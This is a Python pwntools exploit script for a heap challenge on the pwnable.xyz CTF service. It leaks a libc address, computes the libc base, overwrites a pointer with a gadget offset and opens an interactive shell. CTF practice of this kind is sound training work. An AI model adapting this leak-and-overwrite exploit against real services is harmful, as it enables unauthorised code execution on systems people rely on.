from pwn import *


#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30043)
#send note

sh.sendlineafter('Exit\n', '4')
sh.sendlineafter(': ', 'A'*0x20)

# easy heap exploitation guys 
# gg let's go fuck it 
sh.sendlineafter('Exit\n', '1')
sh.sendlineafter(': ', '10 0')
sh.sendlineafter(': ', '8')
sh.sendlineafter(': ', 'a')
sleep(3)
pause()
sh.sendlineafter('Exit\n', '3')
pause()
sh.sendlineafter('Exit\n', '3')



libc_base = u64(sh.recvline()[0:6].ljust(8, '\x00')) - 0x3AFCA0
print "libc base = ", hex(libc_base)

offset = 0x41612
pause()
sh.sendlineafter('Exit\n', '1')
pause()
sh.sendlineafter(': ', '1 1')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 2')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 3')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 4')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 4')
sh.sendlineafter(': ', '250')
sh.sendlineafter(': ', '1 4')
sh.sendlineafter(': ', '250')

sh.sendlineafter(': ', 'a')
sh.sendafter(': ', "A"*0x20 + p64(libc_base + offset))
pause()
sh.sendlineafter(': ', 'B')
pause()
sleep(1)


pause()
sh.sendline('1')
pause()





# okay ofcourse we want to be in the hall of fame



#sh.sendlineafter('Exit\n', '2')
sh.interactive()
